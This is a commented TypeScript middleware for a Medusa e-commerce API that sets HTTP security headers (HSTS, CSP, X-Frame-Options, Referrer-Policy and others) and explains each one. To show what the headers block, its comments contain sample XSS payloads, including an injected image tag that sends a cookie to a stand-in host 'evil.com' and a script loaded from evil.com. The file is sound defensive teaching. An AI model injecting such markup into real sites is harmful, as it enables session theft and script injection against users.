/**
 * Security Headers Middleware - HTTP Security Headers
 * 
 * === WHY SECURITY HEADERS? ===
 * Security headers are HTTP response headers that tell browsers how to behave
 * when handling your site's content. They're like instructions that say:
 * "Hey browser, please protect my users by doing X, Y, and Z."
 * 
 * Think of them as a security checklist for browsers:
 * ✓ Only load content over HTTPS
 * ✓ Don't try to guess file types
 * ✓ Don't let other sites embed this page
 * ✓ Block XSS attacks
 * ✓ Only load resources from trusted sources
 * ✓ Be careful about what information you send in the Referer header
 * 
 * === WHY ARE THESE IMPORTANT? ===
 * Without these headers, browsers use permissive defaults that were designed
 * for compatibility, not security. This leaves your users vulnerable to:
 * 
 * 1. Man-in-the-Middle Attacks (no HTTPS enforcement)
 * 2. MIME Sniffing Attacks (browser guesses wrong file type)
 * 3. Clickjacking (your site embedded in malicious iframe)
 * 4. Cross-Site Scripting (XSS) attacks
 * 5. Data Leakage (sensitive URLs in Referer header)
 * 6. Malicious Resource Loading (scripts from untrusted sources)
 * 
 * === DEFENSE IN DEPTH ===
 * Security headers are part of a "defense in depth" strategy:
 * 
 * Layer 1: Input Validation (prevent bad data from entering)
 * Layer 2: Output Encoding (prevent XSS when displaying data)
 * Layer 3: CSRF Protection (prevent unauthorized actions)
 * Layer 4: Security Headers (tell browser to enforce security rules) ← We are here
 * Layer 5: Rate Limiting (prevent brute force attacks)
 * 
 * Even if one layer fails, the others provide protection.
 */

import type {
  MedusaNextFunction,
  MedusaRequest,
  MedusaResponse,
} from '@medusajs/framework/http';

/**
 * Configuration for security headers
 * 
 * This allows customization of header values while providing secure defaults.
 * You might want to customize these for:
 * - Development vs Production environments
 * - Different security requirements
 * - Compatibility with specific browsers or CDNs
 */
export interface SecurityHeadersConfig {
  /**
   * Strict-Transport-Security (HSTS)
   * 
   * How long (in seconds) browsers should remember to only access this site over HTTPS.
   * Default: 31536000 seconds = 1 year
   */
  hstsMaxAge?: number;

  /**
   * Content-Security-Policy (CSP)
   * 
   * Controls which resources (scripts, styles, images) can be loaded.
   * Default: "default-src 'self'" (only load resources from same origin)
   * 
   * You might want to customize this to allow:
   * - CDN resources: "default-src 'self' cdn.example.com"
   * - Inline scripts: "script-src 'self' 'unsafe-inline'" (not recommended!)
   * - Analytics: "script-src 'self' www.google-analytics.com"
   */
  contentSecurityPolicy?: string;

  /**
   * Referrer-Policy
   * 
   * Controls how much information is sent in the Referer header.
   * Default: "strict-origin-when-cross-origin"
   * 
   * Options (from most to least restrictive):
   * - "no-referrer": Never send Referer header
   * - "same-origin": Only send for same-origin requests
   * - "strict-origin": Only send origin (not full URL) for HTTPS→HTTPS
   * - "strict-origin-when-cross-origin": Full URL for same-origin, origin only for cross-origin
   */
  referrerPolicy?: string;

  /**
   * X-Frame-Options
   * 
   * Controls whether this page can be embedded in an iframe.
   * Default: "DENY" (never allow embedding)
   * 
   * Options:
   * - "DENY": Never allow embedding (most secure)
   * - "SAMEORIGIN": Allow embedding only from same origin
   * - "ALLOW-FROM uri": Allow embedding from specific URI (deprecated, use CSP instead)
   */
  xFrameOptions?: string;
}

/**
 * Default security headers configuration
 * 
 * These values are based on OWASP (Open Web Application Security Project)
 * recommendations and industry best practices.
 * 
 * They provide strong security while maintaining compatibility with modern browsers.
 */
export const DEFAULT_SECURITY_HEADERS_CONFIG: SecurityHeadersConfig = {
  hstsMaxAge: 31536000, // 1 year in seconds
  contentSecurityPolicy: "default-src 'self'",
  referrerPolicy: 'strict-origin-when-cross-origin',
  xFrameOptions: 'DENY',
};

/**
 * Security Headers Middleware
 * 
 * This middleware adds security headers to ALL responses from your API.
 * It's designed to be applied globally, not just to specific routes.
 * 
 * How it works:
 * 1. Request comes in
 * 2. Your route handler processes it
 * 3. Before sending response, this middleware adds security headers
 * 4. Response goes out with headers attached
 * 
 * @param config - Optional configuration to override defaults
 * @returns Middleware function that adds security headers
 */
export function securityHeaders(
  config: SecurityHeadersConfig = DEFAULT_SECURITY_HEADERS_CONFIG
) {
  // Merge provided config with defaults
  // This allows partial overrides: you can change just one header
  const finalConfig = {
    ...DEFAULT_SECURITY_HEADERS_CONFIG,
    ...config,
  };

  /**
   * The actual middleware function
   * 
   * This is what gets called for each request.
   * It follows the Express/Medusa middleware pattern:
   * - req: The incoming request
   * - res: The outgoing response
   * - next: Function to call the next middleware
   */
  return function securityHeadersMiddleware(
    _req: MedusaRequest,
    res: MedusaResponse,
    next: MedusaNextFunction
  ) {
    /**
     * HEADER 1: Strict-Transport-Security (HSTS)
     * 
     * === WHAT IT DOES ===
     * Tells browsers: "For the next year, ONLY access this site over HTTPS,
     * even if the user types http:// or clicks an http:// link."
     * 
     * === WHY IT'S IMPORTANT ===
     * Prevents Man-in-the-Middle (MITM) attacks:
     * 
     * Without HSTS:
     * 1. User types "example.com" (no https://)
     * 2. Browser tries http://example.com first
     * 3. Attacker intercepts this HTTP request
     * 4. Attacker can steal session cookies, inject malicious code
     * 5. Even if site redirects to HTTPS, damage is done
     * 
     * With HSTS:
     * 1. User types "example.com"
     * 2. Browser remembers "always use HTTPS for this site"
     * 3. Browser goes directly to https://example.com
     * 4. No HTTP request = no opportunity for MITM attack
     * 
     * === HOW IT WORKS ===
     * - max-age=31536000: Remember for 1 year (31,536,000 seconds)
     * - After first HTTPS visit, browser enforces HTTPS for 1 year
     * - Timer resets on each visit (as long as header is present)
     * 
     * === IMPORTANT NOTES ===
     * - Only works if user visits via HTTPS at least once
     * - For first-time visitors, consider HSTS preload list
     * - Once set, you MUST support HTTPS for the duration
     * - If HTTPS breaks, users can't access your site until max-age expires
     * 
     * Requirement: 13.1
     */
    res.setHeader(
      'Strict-Transport-Security',
      `max-age=${finalConfig.hstsMaxAge}`
    );

    /**
     * HEADER 2: X-Content-Type-Options
     * 
     * === WHAT IT DOES ===
     * Tells browsers: "Don't try to guess the file type. Trust the Content-Type
     * header I'm sending."
     * 
     * === WHY IT'S IMPORTANT ===
     * Prevents MIME Sniffing attacks:
     * 
     * The Problem (MIME Sniffing):
     * 1. Server sends file with Content-Type: text/plain
     * 2. File contains: <script>alert('XSS')</script>
     * 3. Browser "helpfully" detects it looks like HTML
     * 4. Browser executes it as HTML/JavaScript
     * 5. XSS attack succeeds!
     * 
     * With X-Content-Type-Options: nosniff:
     * 1. Server sends file with Content-Type: text/plain
     * 2. File contains: <script>alert('XSS')</script>
     * 3. Browser sees nosniff header
     * 4. Browser displays it as plain text (doesn't execute)
     * 5. Attack blocked!
     * 
     * === REAL-WORLD EXAMPLE ===
     * User uploads "profile.jpg" that's actually HTML with JavaScript:
     * - Without nosniff: Browser might execute it as HTML (XSS)
     * - With nosniff: Browser treats it as image, fails to load (safe)
     * 
     * === HOW IT WORKS ===
     * - nosniff: The only valid value (it's a flag, not a setting)
     * - Applies to all resources: scripts, stylesheets, images, etc.
     * - Browser strictly follows Content-Type header
     * 
     * Requirement: 13.2
     */
    res.setHeader('X-Content-Type-Options', 'nosniff');

    /**
     * HEADER 3: X-Frame-Options
     * 
     * === WHAT IT DOES ===
     * Tells browsers: "Don't let other websites embed this page in an iframe."
     * 
     * === WHY IT'S IMPORTANT ===
     * Prevents Clickjacking attacks:
     * 
     * Clickjacking Attack Scenario:
     * 1. Attacker creates evil.com with invisible iframe of yourbank.com
     * 2. Attacker overlays fake "Click here for free iPad!" button
     * 3. User clicks, thinking they're clicking the fake button
     * 4. Actually clicking "Transfer $1000" button in invisible iframe
     * 5. Money transferred to attacker!
     * 
     * With X-Frame-Options: DENY:
     * 1. Attacker tries to embed yourbank.com in iframe
     * 2. Browser sees X-Frame-Options: DENY header
     * 3. Browser refuses to load the page in iframe
     * 4. Attack blocked!
     * 
     * === OPTIONS ===
     * - DENY: Never allow embedding (most secure) ← We use this
     * - SAMEORIGIN: Allow embedding only from same domain
     * - ALLOW-FROM uri: Allow specific domain (deprecated)
     * 
     * === WHEN TO USE SAMEORIGIN ===
     * Use SAMEORIGIN if you need to embed your own pages:
     * - Dashboard embedding analytics iframe
     * - Admin panel with embedded reports
     * - Multi-page application with iframe navigation
     * 
     * For authentication pages, DENY is always the right choice.
     * 
     * Requirement: 13.3
     */
    res.setHeader('X-Frame-Options', finalConfig.xFrameOptions!);

    /**
     * HEADER 4: X-XSS-Protection
     * 
     * === WHAT IT DOES ===
     * Tells browsers: "Enable your built-in XSS filter and block the page
     * if an attack is detected."
     * 
     * === WHY IT'S IMPORTANT ===
     * Provides an extra layer of XSS protection:
     * 
     * XSS (Cross-Site Scripting) Attack:
     * 1. Attacker injects malicious script into your site
     * 2. Script executes in victim's browser
     * 3. Script can steal cookies, session tokens, personal data
     * 
     * Browser XSS Filter:
     * - Detects common XSS patterns in URLs and form submissions
     * - Blocks page rendering if attack detected
     * - Not perfect, but catches many simple attacks
     * 
     * === HOW IT WORKS ===
     * - 1: Enable XSS filter
     * - mode=block: Block entire page if XSS detected (don't try to sanitize)
     * 
     * === IMPORTANT NOTES ===
     * - This header is somewhat deprecated (modern browsers use CSP instead)
     * - Chrome removed XSS Auditor in 2019 (had bypass vulnerabilities)
     * - Still useful for older browsers (IE, older Edge)
     * - Defense in depth: doesn't hurt to include it
     * 
     * === BETTER ALTERNATIVE ===
     * Content-Security-Policy is the modern replacement:
     * - More powerful and flexible
     * - Actively maintained and improved
     * - Supported by all modern browsers
     * 
     * We include both for maximum compatibility.
     * 
     * Requirement: 13.4
     */
    res.setHeader('X-XSS-Protection', '1; mode=block');

    /**
     * HEADER 5: Content-Security-Policy (CSP)
     * 
     * === WHAT IT DOES ===
     * Tells browsers: "Here's a whitelist of sources you're allowed to load
     * resources from. Block everything else."
     * 
     * === WHY IT'S IMPORTANT ===
     * CSP is the most powerful security header. It prevents:
     * 
     * 1. XSS Attacks:
     *    - Attacker injects <script src="evil.com/steal.js">
     *    - CSP blocks it (evil.com not in whitelist)
     * 
     * 2. Data Injection:
     *    - Attacker injects <img src="evil.com/track?cookie=...">
     *    - CSP blocks it (evil.com not in whitelist)
     * 
     * 3. Malicious Redirects:
     *    - Attacker injects <meta http-equiv="refresh" content="0;url=evil.com">
     *    - CSP blocks it
     * 
     * === HOW IT WORKS ===
     * CSP uses directives to control different resource types:
     * 
     * - default-src: Fallback for all resource types
     * - script-src: Where JavaScript can be loaded from
     * - style-src: Where CSS can be loaded from
     * - img-src: Where images can be loaded from
     * - connect-src: Where AJAX/fetch requests can go
     * - font-src: Where fonts can be loaded from
     * - frame-src: What can be embedded in iframes
     * 
     * === OUR POLICY: default-src 'self' ===
     * This means:
     * - 'self': Only load resources from same origin (same domain)
     * - Blocks all external resources (scripts, images, styles, etc.)
     * - Blocks inline scripts and styles (common XSS vector)
     * 
     * === EXAMPLE SCENARIOS ===
     * 
     * Scenario 1: Inline Script (BLOCKED)
     * ```html
     * <script>alert('XSS')</script>
     * ```
     * CSP blocks this because inline scripts aren't allowed.
     * 
     * Scenario 2: External Script (BLOCKED)
     * ```html
     * <script src="https://evil.com/malware.js"></script>
     * ```
     * CSP blocks this because evil.com isn't 'self'.
     * 
     * Scenario 3: Same-Origin Script (ALLOWED)
     * ```html
     * <script src="/js/app.js"></script>
     * ```
     * CSP allows this because it's from same origin.
     * 
     * === CUSTOMIZING CSP ===
     * You might need to relax CSP for:
     * 
     * 1. CDN Resources:
     *    "default-src 'self' cdn.example.com"
     * 
     * 2. Google Analytics:
     *    "script-src 'self' www.google-analytics.com; img-src 'self' www.google-analytics.com"
     * 
     * 3. Inline Styles (not recommended):
     *    "style-src 'self' 'unsafe-inline'"
     * 
     * 4. Development (very permissive, NEVER use in production):
     *    "default-src * 'unsafe-inline' 'unsafe-eval'"
     * 
     * === CSP REPORTING ===
     * You can add report-uri to get notified of violations:
     * "default-src 'self'; report-uri /csp-violation-report"
     * 
     * This helps you:
     * - Detect XSS attempts
     * - Find legitimate resources you forgot to whitelist
     * - Monitor security posture
     * 
     * Requirement: 13.5
     */
    res.setHeader(
      'Content-Security-Policy',
      finalConfig.contentSecurityPolicy!
    );

    /**
     * HEADER 6: Referrer-Policy
     * 
     * === WHAT IT DOES ===
     * Tells browsers: "Here's how much information to include in the Referer
     * header when navigating away from this page."
     * 
     * === WHY IT'S IMPORTANT ===
     * The Referer header can leak sensitive information:
     * 
     * Problem Scenario:
     * 1. User visits: https://yourbank.com/account?id=12345&balance=50000
     * 2. User clicks link to external site (e.g., help documentation)
     * 3. Browser sends Referer: https://yourbank.com/account?id=12345&balance=50000
     * 4. External site logs the Referer
     * 5. External site now knows user's account ID and balance!
     * 
     * With Referrer-Policy: strict-origin-when-cross-origin:
     * 1. User visits: https://yourbank.com/account?id=12345&balance=50000
     * 2. User clicks link to external site
     * 3. Browser sends Referer: https://yourbank.com (origin only, no path/query)
     * 4. External site only knows user came from yourbank.com
     * 5. Sensitive data protected!
     * 
     * === POLICY OPTIONS ===
     * From most to least restrictive:
     * 
     * 1. no-referrer:
     *    - Never send Referer header
     *    - Most private, but breaks some analytics
     * 
     * 2. same-origin:
     *    - Send full URL for same-origin requests
     *    - Send nothing for cross-origin requests
     *    - Good for privacy, but no cross-origin analytics
     * 
     * 3. strict-origin:
     *    - Send origin only (no path/query)
     *    - Only for HTTPS → HTTPS (downgrade = no referrer)
     *    - Good balance of privacy and functionality
     * 
     * 4. strict-origin-when-cross-origin: ← We use this
     *    - Same-origin: Send full URL
     *    - Cross-origin: Send origin only
     *    - HTTPS → HTTP: Send nothing (downgrade protection)
     *    - Best balance for most applications
     * 
     * 5. unsafe-url:
     *    - Always send full URL (including path and query)
     *    - Worst for privacy, best for analytics
     *    - Never use for sensitive applications
     * 
     * === EXAMPLE BEHAVIORS ===
     * 
     * With strict-origin-when-cross-origin:
     * 
     * Same-Origin Navigation:
     * - From: https://example.com/page1?secret=123
     * - To: https://example.com/page2
     * - Referer: https://example.com/page1?secret=123 (full URL)
     * 
     * Cross-Origin Navigation:
     * - From: https://example.com/page1?secret=123
     * - To: https://other.com/page
     * - Referer: https://example.com (origin only)
     * 
     * HTTPS to HTTP (Downgrade):
     * - From: https://example.com/page1?secret=123
     * - To: http://other.com/page
     * - Referer: (none) (no referrer on downgrade)
     * 
     * === WHEN TO USE DIFFERENT POLICIES ===
     * 
     * Use "no-referrer" for:
     * - Medical records
     * - Financial data
     * - Any highly sensitive application
     * 
     * Use "same-origin" for:
     * - Internal tools
     * - Admin panels
     * - Applications that don't need cross-origin analytics
     * 
     * Use "strict-origin-when-cross-origin" for:
     * - E-commerce sites (our case)
     * - Social media
     * - Most public-facing applications
     * 
     * Requirement: 13.6
     */
    res.setHeader('Referrer-Policy', finalConfig.referrerPolicy!);

    /**
     * Call next() to continue to the next middleware or route handler
     * 
     * This is crucial! Without next(), the request would hang forever.
     * 
     * Middleware execution order:
     * 1. Security headers middleware (this function) - adds headers
     * 2. next() - passes control to next middleware
     * 3. CSRF protection middleware - validates tokens
     * 4. next() - passes control to next middleware
     * 5. Rate limiting middleware - checks limits
     * 6. next() - passes control to route handler
     * 7. Route handler - processes request, sends response
     * 8. Response goes back through middleware chain (headers already set)
     */
    next();
  };
}

/**
 * Default security headers middleware instance
 * 
 * This is a pre-configured instance using default settings.
 * Use this for most cases unless you need custom configuration.
 * 
 * Usage in middlewares.ts:
 * ```typescript
 * import { securityHeadersMiddleware } from './lib/security-headers';
 * 
 * export default defineMiddlewares({
 *   routes: [
 *     {
 *       matcher: "*", // Apply to all routes
 *       middlewares: [securityHeadersMiddleware],
 *     },
 *   ],
 * });
 * ```
 */
export const securityHeadersMiddleware = securityHeaders();
